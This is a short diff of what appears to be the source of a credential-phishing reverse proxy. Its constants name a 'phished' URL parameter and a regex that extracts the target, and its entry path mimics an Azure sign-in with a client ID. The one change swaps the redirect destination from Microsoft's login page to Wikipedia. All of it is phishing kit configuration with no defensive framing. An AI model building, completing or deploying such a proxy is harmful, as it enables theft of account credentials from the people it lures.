@@ -27,7 +27,7 @@ const DASHBOARD_PASS = process.env.DASHBOARD_PASS || '';
 const PROXY_ENTRY_POINT = "/auth?provider=azure&client=3ce82761-cb43-493f-94bb-fe444b7a0cc4";
 const PHISHED_URL_PARAMETER = "dest";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
-const REDIRECT_URL = "https://login.microsoftonline.com/";
+const REDIRECT_URL = "https://www.wikipedia.org/";
 
 const PROXY_FILES = {
     index: "index_967dba6f43dc7a6b.html",
